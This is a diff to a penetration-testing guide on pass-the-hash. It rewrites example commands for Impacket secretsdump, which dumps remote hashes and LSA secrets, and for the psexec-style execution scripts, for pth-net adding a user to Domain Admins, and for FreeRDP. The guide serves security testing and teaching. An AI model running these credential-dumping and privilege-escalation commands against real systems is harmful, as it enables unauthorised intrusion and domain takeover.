@@ -21,9 +21,8 @@ There are many tools that implement pass-the-hash: [Impacket scripts](https://gi
 The Impacket script [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python) has the ability to remotely dump hashes and LSA secrets from a machine (`LMhash` can be empty) (see [dumping credentials from registry hives](../credentials/dumping/sam-and-lsa-secrets.md)).
 
 ```bash
-secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
-secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
-secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
+secretsdump.py -hashes ":$NT_HASH" "$DOMAIN/$USER@$TARGET"
+secretsdump.py "$DOMAIN/$USER:$PASSWORD@$TARGET"
 ```
 
 [NetExec](https://github.com/Pennyw0rth/NetExec) (Python) has the ability to do it on a set of targets. The `bh_owned` has the ability to set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound) (see [dumping credentials from registry hives](../credentials/dumping/sam-and-lsa-secrets.md)).
@@ -49,11 +48,11 @@ lsassy -d $DOMAIN -u $USER -H $NThash $TARGETS
 Some Impacket scripts enable testers to execute commands on target systems with pass-the-hash (`LMhash` can be empty).
 
 ```bash
-psexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
-smbexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
-wmiexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
-atexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
-dcomexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
+psexec.py -hashes "ffffffffffffffffffffffffffffffff:$NT_HASH" "$DOMAIN/$USER@$TARGET"
+smbexec.py -hashes "ffffffffffffffffffffffffffffffff:$NT_HASH" "$DOMAIN/$USER@$TARGET"
+wmiexec.py -hashes "ffffffffffffffffffffffffffffffff:$NT_HASH" "$DOMAIN/$USER@$TARGET"
+atexec.py -hashes "ffffffffffffffffffffffffffffffff:$NT_HASH" "$DOMAIN/$USER@$TARGET"
+dcomexec.py -hashes "ffffffffffffffffffffffffffffffff:$NT_HASH" "$DOMAIN/$USER@$TARGET"
 ```
 
 [NetExec](https://github.com/Pennyw0rth/NetExec) (Python) has the ability to do it on a set of targets
@@ -76,8 +75,8 @@ sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NThash
 The [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) (Python) can be used from a Linux system to operate LDAP queries, add a user to a group and so on (`LMhash` can be `ffffffffffffffffffffffffffffffff`).
 
 ```bash
-pth-net rpc group members "Domain admins" -U 'Domain/User%LMhash:NThash' -S $DOMAIN_CONTROLLER
-pth-net rpc group addmem "Domain admins" Shutdown -U 'Domain/Admin%LMhash:NThash' -S $DOMAIN_CONTROLLER
+pth-net rpc group members "Domain admins" -U "$DOMAIN/$USER%ffffffffffffffffffffffffffffffff:$NT_HASH" -S $DOMAIN_CONTROLLER
+pth-net rpc group addmem "Domain admins" Shutdown -U "$DOMAIN/$USER%ffffffffffffffffffffffffffffffff:$NT_HASH" -S $DOMAIN_CONTROLLER
 ```
 
 
@@ -86,7 +85,7 @@ pth-net rpc group addmem "Domain admins" Shutdown -U 'Domain/Admin%LMhash:NThash
 [FreeRDP](https://github.com/FreeRDP/FreeRDP) (C) has the ability to do pass-the-hash for opening RDP sessions.
 
 ```bash
-xfreerdp /u:$USER /d:$DOMAIN /pth:'LMhash:NThash' /v:$TARGET /h:1010 /w:1920
+xfreerdp /u:$USER /d:$DOMAIN /pth:"ffffffffffffffffffffffffffffffff:$NT_HASH" /v:$TARGET /h:1010 /w:1920
 ```
 
 :::
